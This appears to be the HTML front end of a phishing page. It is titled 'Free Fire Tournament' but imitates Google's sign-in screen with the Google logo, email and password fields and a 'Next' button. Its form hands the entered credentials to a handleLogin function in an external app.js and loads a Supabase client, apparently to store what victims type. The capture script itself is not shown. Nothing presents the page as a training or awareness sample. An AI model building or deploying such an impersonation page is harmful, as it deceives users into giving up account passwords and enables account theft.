<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Tournament</title>
    <style>
        /* Reset all default styling */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        /* Body setup */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f2f2f2;
            font-family: 'Roboto', sans-serif;
        }

        /* Login container */
        .login-container {
            width: 380px;
            padding: 30px;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .login-container h1 {
            font-size: 2.5em;
            color: #333;
            margin-bottom: 20px;
            font-weight: 400;
        }

        /* Input fields */
        .login-container input {
            width: 100%;
            padding: 14px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
            background-color: #f9f9f9;
            transition: border 0.3s;
        }

        .login-container input:focus {
            border-color: #4285F4;
            outline: none;
        }

        /* Button */
        .login-container button {
            width: 100%;
            padding: 14px;
            background-color: #4285F4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-container button:hover {
            background-color: #357ae8;
        }

        /* Forgot password link */
        .forgot-password {
            margin-top: 10px;
            font-size: 0.9em;
            color: #4285F4;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Sign up link */
        .signup {
            margin-top: 15px;
            font-size: 1em;
            color: #5f6368;
        }

        .signup a {
            color: #4285F4;
            text-decoration: none;
        }

        .signup a:hover {
            text-decoration: underline;
        }

        /* Google logo */
        .google-logo {
            margin-bottom: 30px;
        }

        /* Responsive design for small screens */
        @media (max-width: 400px) {
            .login-container {
                width: 90%;
                padding: 20px;
            }

            .login-container h1 {
                font-size: 2em;
            }

            .login-container input,
            .login-container button {
                font-size: 1em;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <!-- Google Logo -->
    <img src="https://imgs.search.brave.com/WFUCWSTA1WQZxQ6Bj0PpSiIS0qx9cb9e-ysxkOY4rTA/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9jZG4x/Lmljb25maW5kZXIu/Y29tL2RhdGEvaWNv/bnMvZ29vZ2xlLXMt/bG9nby8xNTAvR29v/Z2xlX0ljb25zLTA5/LTUxMi5wbmc" alt="Google logo" class="google-logo" width="120">
    
    <h1>Sign In</h1>
    <form id="loginForm" onsubmit="handleLogin(event)">
        <input type="email" id="email" name="email" required placeholder="Email or phone" />
        <input type="password" id="password" name="password" required minlength="8" placeholder="Password" />
        <button type="submit">Next</button>
    </form>
    
    <a href="#" class="forgot-password">Forgot email?</a>
    
    <div class="signup">
        <span>Don't have an account? <a href="#">Create account</a></span>
    </div>
    
    <!-- Message display area -->
    <div id="message"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.11.0/dist/umd/supabase.min.js"></script>
<script src="app.js"></script>

</body>
</html>
